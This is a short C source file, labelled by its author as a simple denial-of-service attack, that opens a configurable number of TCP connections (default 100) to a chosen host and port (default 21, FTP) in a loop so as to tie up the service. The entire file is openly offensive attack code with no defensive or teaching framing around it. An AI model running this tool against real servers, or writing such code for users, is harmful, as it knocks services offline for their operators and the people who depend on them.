/*
 * DoS simple attack implementation by Giovani Ferreira
 */

#include<stdio.h>
#include<netdb.h>
#include<arpa/inet.h>
#include<stdlib.h>
#include"dos_helper.h"

#define DEFAULT_PORT 21                             /* Default port for attack - Setted to 21 = FTP */
#define CONNECTIONS 100                             /* Number of connections to open with the service */

int main(int argc, char *argv[])
{
    int sock = 0, connection = 0;
    int port = DEFAULT_PORT;                        /* Service port */
    char* target_host = NULL;                       /* The domain/ip to perform the attack */
    int qnt_conn = CONNECTIONS;                     /* The desired number of connections to open */
    _Bool verbose = false;                          /* Operation mode set to quiet for default */
    struct sockaddr_in target;

    parse_args(argc, argv, &port, &target_host, &qnt_conn, &verbose);

    printf("==> Starting DoS in %s\n", target_host);
    printf("==> Attempting %d connections at port %d\n", qnt_conn, port);

    /* Oppening connections in service */
    for (int i = 0; i < qnt_conn; i++) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
       
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        target.sin_addr.s_addr = inet_addr(target_host);

        connection = connect(sock, (struct sockaddr *)&target, sizeof(target));

        if (connection == 0) {
            if (verbose)
                printf("\tConnection number %d oppened\n", i + 1);
        } else {
            printf("\t:: Connection number %d failed\n", i + 1);
        }
    }

    printf("==> Finished DoS attack %s:%d\n", target_host, port);

    return 0;
}
